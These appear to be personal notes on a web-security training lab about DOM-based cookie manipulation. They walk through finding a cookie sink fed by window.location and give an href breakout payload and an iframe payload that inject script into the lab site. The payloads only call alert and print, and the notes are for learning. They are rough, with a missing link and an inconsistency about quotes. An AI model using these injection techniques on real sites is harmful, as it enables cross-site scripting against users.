# [DOM Vuln] Lab: DOM-based cookie manipulation (1)

---

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled.png)

found a possible sink: 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%201.png)

since the website is using the window.location for the last session cookie 

**NOTE GO TO PAGE SOURCE FIRST ALWAYS:** 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%202.png)

looking at the view page source we see the href uses single quotes where as the inspect page source uses double quotes 

to to escape the href tag I need to use double quotes. 

using this payload 

```jsx
HTTP://myurl.ca/product?productId=1&'><script>alert(1)</script>';!--
```

since the website is using the window.location for the last session cookie 

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%203.png)

was able to use this github: {}and used a payload from there to do filter evasion but I also needed to change it

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%204.png)

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%205.png)

my exploit: 

```jsx
<iframe src="https://0a700066038d3bf981ad39ba00da001e.web-security-academy.net/product?productId=1" onload="window.location.href='https://0a700066038d3bf981ad39ba00da001e.web-security-academy.net/product?productId=1&%27><script>print()</script>%27'"> 

<iframe><img title="</iframe><img src onerror=window.location.href='https://0a700066038d3bf981ad39ba00da001e.web-security-academy.net/product?productId=1&%27><script>print()</script>%27'>"></iframe>

</iframe>

```

![Untitled](%5BDOM%20Vuln%5D%20Lab%20DOM-based%20cookie%20manipulation%20(1)%209c55489aa7ee4650a499c1295e1df0e1/Untitled%206.png)

---